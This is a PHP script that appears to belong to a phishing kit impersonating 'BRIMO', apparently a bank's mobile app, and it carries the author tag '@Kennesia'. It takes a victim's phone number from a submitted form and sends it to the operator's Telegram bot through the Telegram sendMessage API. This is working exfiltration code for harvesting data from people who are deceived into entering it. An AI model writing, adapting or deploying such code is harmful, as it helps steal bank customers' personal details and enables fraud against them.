<?php

session_start();
include "./telegram.php";

$a = $_POST['a'];
$_SESSION['a'] = $a;

$message = "
( BRIMO | @Kennesia )

- Phone : ".$a."
";

function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
    $url = "https://api.telegram.org/bot" . $kennesia_token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $kennesia_telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
?>
